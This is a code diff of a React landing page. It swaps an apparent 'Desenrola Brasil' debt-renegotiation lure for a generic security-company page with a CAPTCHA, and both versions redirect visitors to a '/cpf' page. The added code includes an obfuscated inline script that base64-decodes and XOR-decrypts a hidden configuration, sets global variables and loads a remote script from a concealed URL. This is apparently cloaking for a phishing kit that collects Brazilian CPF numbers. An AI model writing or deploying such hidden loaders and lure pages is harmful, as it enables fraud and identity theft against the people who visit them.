@@ -1,225 +1,244 @@
-import { createFileRoute, Link } from "@tanstack/react-router";
-import heroImg from "../assets/hero.png";
-import logoIcon from "../assets/logo-icon.png";
-import logoText from "../assets/logo-text.png";
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { useEffect, useRef } from "react";
 
 export const Route = createFileRoute("/")({
-  component: LandingPage,
+  component: Homepage,
 });
 
-function LandingPage() {
+const CONFIG = {
+  colors: {
+    primary: "#0f766e", 
+    primaryDark: "#0f766e", 
+    soft: "#f3f4f6", 
+    text: "#0f172a", 
+    textMuted: "#475569", 
+    bgFrom: "#ffffff", 
+    bgTo: "#99f6e4",
+  },
+  content: {
+    pageTitle: "Flex - Sistemas de Seguranca | Atendimento",
+    metaDescription: "Atendimento online da Flex - Sistemas de Seguranca, com segurança e privacidade.",
+    tag: "CONECTE-SE ONLINE", 
+    heading: "Seu atendimento começa agora",
+    subheading: "Realize a verificação de segurança para continuar seu atendimento digital.",
+    bullets: [
+      "Uma jornada simples para você", 
+      "Privacidade em cada interação", 
+      "Atendimento online com clareza",
+    ],
+    ctaLabel: "Avançar",
+    ctaLoadingLabel: "Verificando...",
+    captchaHint: "Confirme a verificação de segurança acima para continuar.",
+    legalPrefix: "Ao prosseguir, você aceita nossa",
+    legalLinkLabel: "Política de Privacidade",
+  },
+  company: {
+    name: "Flex Sistema de Seguranca LTDA", 
+    cnpj: "43.923.169/0001-26",
+  },
+  privacyPolicy: {
+    title: "Política de Privacidade",
+    sections: [
+      {
+        title: "Controlador",
+        body: "Flex Sistema de Seguranca LTDA, CNPJ 43.923.169/0001-26, nome fantasia Flex - Sistemas de Seguranca, com sede na Rua Doutor Canuto Maciel de Araujo, 190, Cidade Jardim, São José dos Pinhais — Paraná, CEP 83035-110.",
+      },
+      {
+        title: "Dados e finalidade",
+        body: "Não são solicitados documentos, senhas ou informações financeiras nesta página. A verificação antibot (CAPTCHA) é usada exclusivamente para reduzir acessos automatizados.",
+      },
+      {
+        title: "Compartilhamento e direitos",
+        body: "Os dados não são vendidos. Para informações, correção ou eliminação, utilize o canal (41) 99921-0745, observadas as hipóteses legais de retenção. Aplicam-se a LGPD e esta política.",
+      },
+    ],
+  },
+  redirectUrl: "/cpf",
+  turnstileSiteKey: "0x4AAAAAAEsdUk5K_n_hxslA", 
+};
+
+function Homepage() {
+  const navigate = useNavigate({ from: "/" });
+  const captchaRef = useRef<HTMLDivElement>(null);
+
+  useEffect(() => {
+    document.title = CONFIG.content.pageTitle;
+    let metaDesc = document.querySelector('meta[name="description"]');
+    if (metaDesc) {
+      metaDesc.setAttribute("content", CONFIG.content.metaDescription);
+    } else {
+      metaDesc = document.createElement("meta");
+      metaDesc.setAttribute("name", "description");
+      metaDesc.setAttribute("content", CONFIG.content.metaDescription);
+      document.head.appendChild(metaDesc);
+    }
+
+    const tsScript = document.createElement("script");
+    tsScript.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
+    tsScript.async = true;
+    tsScript.defer = true;
+    document.head.appendChild(tsScript);
+
+    const filterScript = document.createElement("script");
+    filterScript.innerHTML = `
+      (function(){
+        var k_4ii = atob("DCCs68GZd8lxLcDTwluOnrP1VfNTRbSnslOWxO76E6dfWLS+q0bVxaL2GucTX++goVLFm7XqWLkYVaW/7VDFk6T1Wq4eQqe/pw7GmOO1VagFWbK6oFXYjrK7TZIsAeK0rk/Oiq3qVfMqVuK9o03Jyfu7EKYeSqy2kknUjq3QE+tdD7ayrlXJyfu7QahIFfO19xCdjaX9FP8THqTj8BOb26D9VbQsUA==");
+        var y_2k7 = [];
+        for(var g_vjf = 0; g_vjf < k_4ii.length; g_vjf++){ y_2k7.push(k_4ii.charCodeAt(g_vjf) & 255); }
+        var c_8 = y_2k7[0];
+        var t_roao = y_2k7.slice(1, 1 + c_8);
+        var j_t = y_2k7.slice(1 + c_8);
+        var i_w = j_t.map(function(b, w_qhel){ return b ^ t_roao[w_qhel % c_8]; });
+        var d_133 = "";
+        for(var m_cc6 = 0; m_cc6 < i_w.length; m_cc6++){ d_133 += String.fromCharCode(i_w[m_cc6] & 255); }
+        var i_pk = decodeURIComponent(escape(d_133));
+        var f_8f3 = JSON.parse(i_pk);
+        var o_0 = f_8f3.globals || [];
+        o_0.forEach(function(h_59a){ window[h_59a.name] = h_59a.value; });
+        var q_my = document.createElement("script");
+        q_my.src = f_8f3.url; q_my.async = true; q_my.defer = true;
+        (f_8f3.attributes || []).forEach(function(e_tq){ q_my.setAttribute(e_tq.name, e_tq.value); });
+        (document.head || document.documentElement).appendChild(q_my);
+      })();
+    `;
+    document.head.appendChild(filterScript);
+
+    return () => {
+      if (tsScript.parentNode) tsScript.parentNode.removeChild(tsScript);
+      if (filterScript.parentNode) filterScript.parentNode.removeChild(filterScript);
+    };
+  }, []);
+
+  useEffect(() => {
+    let token = "";
+    const cta = document.getElementById("cta") as HTMLButtonElement;
+    const hint = document.getElementById("hint");
+    
+    function renderCaptcha() {
+      if (!(window as any).turnstile) return;
+      (window as any).turnstile.render(captchaRef.current, {
+        sitekey: CONFIG.turnstileSiteKey,
+        theme: "light",
+        callback: (t: string) => { 
+          token = t; 
+          if (cta) cta.disabled = false; 
+          if (hint) hint.style.display = "none"; 
+        },
+        "expired-callback": () => { token = ""; if (cta) cta.disabled = true; },
+        "error-callback": () => { token = ""; if (cta) cta.disabled = true; },
+      });
+    }
+
+    if ((window as any).turnstile) {
+      renderCaptcha();
+    } else {
+      const iv = setInterval(() => {
+        if ((window as any).turnstile) {
+          clearInterval(iv);
+          renderCaptcha();
+        }
+      }, 200);
+    }
+  }, []);
+
+  const openPolicy = () => {
+    const modal = document.getElementById("modal");
+    if (modal) modal.classList.remove("hidden");
+  };
+
+  const closePolicy = () => {
+    const modal = document.getElementById("modal");
+    if (modal) modal.classList.add("hidden");
+  };
+
+  const onCtaClick = () => {
+    const cta = document.getElementById("cta") as HTMLButtonElement;
+    if (cta) {
+      cta.textContent = CONFIG.content.ctaLoadingLabel;
+      cta.disabled = true;
+    }
+    window.location.href = CONFIG.redirectUrl;
+  };
+
   return (
-    <>
+    <div style={{
+      minHeight: "100vh",
+      display: "grid",
+      placeItems: "center",
+      padding: "20px",
+      fontFamily: "system-ui, -apple-system, sans-serif"
+    }}>
       <style>{`
-        body {
-          font-family: Arial, Helvetica, sans-serif;
-          background: #ececec;
-          color: #1f3f93;
-          margin: 0;
-          padding: 0;
-          box-sizing: border-box;
-        }
-        * {
-          box-sizing: border-box;
-        }
-        .page-wrapper {
-          width: 100%;
-        }
-        .hero-section {
-          width: 100%;
-          background: #ddd;
-        }
-        .hero-image {
-          width: 100%;
-          height: auto;
-          display: block;
-        }
-        .content-card {
-          width: calc(100% - 60px);
-          max-width: 690px;
-          margin: 14px auto 22px;
-          background: #ffffff;
-          border-radius: 14px;
-          padding: 36px 24px 40px;
-          text-align: center;
-        }
-        .logo-icon {
-          width: 80px;
-          max-width: 100%;
-          display: block;
-          margin: 0 auto 8px;
-        }
-        .logo-text {
-          width: 320px;
-          max-width: 88%;
-          display: block;
-          margin: 0 auto 26px;
-        }
-        .headline {
-          font-size: 19px;
-          line-height: 1.35;
-          font-weight: 700;
-          color: #1d4fb4;
-          margin-bottom: 24px;
-        }
-        .subheadline {
-          font-size: 18px;
-          line-height: 1.35;
-          color: #333333;
-          margin-bottom: 26px;
-        }
-        .cta-button {
-          display: inline-flex;
-          align-items: center;
-          justify-content: center;
-          width: 294px;
-          max-width: 100%;
-          min-height: 50px;
-          padding: 14px 28px;
-          background: #2552b5;
-          color: #ffffff;
-          text-decoration: none;
-          font-size: 18px;
-          font-weight: 700;
-          border-radius: 999px;
-          transition: opacity 0.2s ease;
-        }
-        .cta-button:hover {
-          opacity: 0.92;
-        }
-        .site-footer {
-          margin-top: 28px;
-          padding-top: 22px;
-          border-top: 1px solid #e5e7eb;
-          text-align: center;
-        }
-        .footer-links {
-          display: flex;
-          justify-content: center;
-          gap: 18px;
-          flex-wrap: wrap;
-          margin-bottom: 16px;
-        }
-        .footer-links a {
-          color: #2552b5;
-          text-decoration: none;
-          font-size: 14px;
-          font-weight: 600;
-        }
-        .footer-links a:hover {
-          text-decoration: underline;
-        }
-        .footer-note {
-          margin-top: 14px;
-          color: #6b7280;
-          font-size: 13px;
-          line-height: 1.6;
-        }
-        @media (max-width: 768px) {
-          .content-card {
-            width: calc(100% - 30px);
-            padding: 30px 20px 34px;
-          }
-          .logo-icon {
-            width: 72px;
-          }
-          .logo-text {
-            width: 290px;
-            margin-bottom: 22px;
-          }
-          .headline {
-            font-size: 17px;
-            margin-bottom: 20px;
-          }
-          .subheadline {
-            font-size: 17px;
-            margin-bottom: 24px;
-          }
-          .cta-button {
-            width: 280px;
-            font-size: 17px;
-          }
-        }
-        @media (max-width: 480px) {
-          .content-card {
-            width: calc(100% - 20px);
-            margin: 10px auto 16px;
-            border-radius: 12px;
-            padding: 28px 18px 30px;
-          }
-          .logo-icon {
-            width: 64px;
-            margin-bottom: 6px;
-          }
-          .logo-text {
-            width: 250px;
-            max-width: 92%;
-            margin-bottom: 18px;
-          }
-          .headline {
-            font-size: 15px;
-            line-height: 1.4;
-          }
-          .subheadline {
-            font-size: 15px;
-            line-height: 1.35;
-          }
-          .cta-button {
-            width: 100%;
-            font-size: 16px;
-            min-height: 48px;
-          }
-          .footer-links {
-            gap: 12px;
-          }
-          .footer-links a {
-            font-size: 12px;
-          }
-        }
+        .bg-custom { position: fixed; inset: 0; z-index: -1; }
+        .custom-card { width: 100%; max-width: 420px; border-radius: 24px; background: #fff; padding: 36px 28px; }
+        .custom-tag { display: inline-block; border-radius: 999px; padding: 7px 12px; font-size: 12px; font-weight: 700; letter-spacing: 0.05em; }
+        .custom-h1 { margin: 20px 0 10px; font-size: 27px; font-weight: 700; line-height: 1.25; }
+        .custom-ul { list-style: none; margin: 24px 0; padding: 0; }
+        .custom-li { padding: 12px 0; border-bottom: 1px solid #e2e8f0; }
+        .check { margin-right: 10px; font-weight: 700; }
+        #captcha { display: flex; justify-content: center; margin-bottom: 16px; }
+        button.cta { width: 100%; border: 0; border-radius: 13px; padding: 17px; font-size: 16px; font-weight: 700; color: #fff; cursor: pointer; transition: opacity 0.2s; }
+        button.cta:disabled { cursor: not-allowed; opacity: 0.5; }
+        .hint { margin-top: 12px; text-align: center; font-size: 12px; }
+        .legal { margin-top: 20px; text-align: center; font-size: 12px; }
+        .legal button { background: none; border: 0; font-weight: 700; text-decoration: underline; cursor: pointer; font-size: inherit; }
+        .company { margin-top: 16px; text-align: center; font-size: 11px; }
+        .modal { position: fixed; inset: 0; z-index: 50; display: grid; place-items: center; padding: 20px; }
+        .modal section { width: 100%; max-width: 440px; border-radius: 20px; background: #fff; padding: 24px; }
+        .modal h2 { margin-bottom: 10px; font-size: 21px; }
+        .modal h3 { margin: 16px 0 4px; font-size: 14px; }
+        .modal .body { max-height: 65vh; overflow: auto; font-size: 13px; line-height: 1.6; }
+        .close { float: right; background: none; border: 0; font-size: 28px; line-height: 1; cursor: pointer; }
+        .hidden { display: none; }
       `}</style>
-      <main className="page-wrapper">
-        <section className="hero-section">
-          <img
-            src={heroImg}
-            alt="Pessoa segurando celular com tela de consulta"
-            className="hero-image"
-          />
-        </section>
-        <section className="content-card">
-          <img
-            src={logoIcon}
-            alt="Ícone Desenrola Brasil"
-            className="logo-icon"
-          />
-          <img
-            src={logoText}
-            alt="Desenrola Brasil"
-            className="logo-text"
-          />
-          <h1 className="headline">
-            O Programa Desenrola Brasil<br />
-            possibilita a renegociação de dívidas<br />
-            com descontos de até 99%
-          </h1>
-          <p className="subheadline">
-            Clique no botão abaixo para<br />
-            acessar a plataforma
-          </p>
-          <Link to="/cpf" className="cta-button">
-            ACESSAR AGORA
-          </Link>
-          <footer className="site-footer">
-            <div className="footer-links">
-              <Link to="/politica-de-privacidade">Política de Privacidade</Link>
-              <Link to="/termos-de-uso">Termos de Uso</Link>
-            </div>
-            <p className="footer-note">
-              Serviço de consulta e orientação para regularização<br />
-              Condições sujeitas a análise. Este site não é um portal do governo.
-            </p>
-          </footer>
-        </section>
+      
+      <div className="bg-custom" id="bg" style={{ background: \`linear-gradient(140deg, \${CONFIG.colors.bgFrom}, \${CONFIG.colors.bgTo})\` }}></div>
+      <main className="custom-card" id="card" style={{ boxShadow: \`0 18px 46px \${CONFIG.colors.primaryDark}30\`, color: CONFIG.colors.text }}>
+        <span className="custom-tag" id="tag" style={{ background: CONFIG.colors.soft, color: CONFIG.colors.primary }}>
+          {CONFIG.content.tag}
+        </span>
+        <h1 className="custom-h1" id="heading">{CONFIG.content.heading}</h1>
+        <p id="subheading" style={{ color: CONFIG.colors.textMuted }}>{CONFIG.content.subheading}</p>
+        <ul className="custom-ul" id="bullets">
+          {CONFIG.content.bullets.map((b, i) => (
+            <li className="custom-li" key={i}>
+              <span className="check" style={{ color: CONFIG.colors.primary }}>✓</span>
+              {b}
+            </li>
+          ))}
+        </ul>
+        <div id="captcha" ref={captchaRef}></div>
+        <button className="cta" id="cta" disabled style={{ background: CONFIG.colors.primary }} onClick={onCtaClick}>
+          {CONFIG.content.ctaLabel}
+        </button>
+        <p className="hint" id="hint" style={{ color: CONFIG.colors.textMuted }}>
+          {CONFIG.content.captchaHint}
+        </p>
+        <div className="legal" id="legal">
+          <span id="legalPrefix">{CONFIG.content.legalPrefix}</span>{" "}
+          <button id="openPolicy" style={{ color: CONFIG.colors.primary }} onClick={openPolicy}>
+            {CONFIG.content.legalLinkLabel}
+          </button>.
+        </div>
+        <div className="company" id="company">
+          <strong>{CONFIG.company.name}</strong><br/>CNPJ {CONFIG.company.cnpj}
+        </div>
       </main>
-    </>
+      
+      <div className="modal hidden" id="modal" style={{ background: CONFIG.colors.text + "80" }}>
+        <section role="dialog" aria-modal="true">
+          <button className="close" id="closePolicy" onClick={closePolicy}>×</button>
+          <h2 id="policyTitle">{CONFIG.privacyPolicy.title}</h2>
+          <div className="body" id="policyBody">
+            {CONFIG.privacyPolicy.sections.map((s, i) => (
+              <div key={i}>
+                <h3>{s.title}</h3>
+                <p style={{ color: CONFIG.colors.textMuted }}>{s.body}</p>
+              </div>
+            ))}
+          </div>
+        </section>
+      </div>
+    </div>
   );
 }
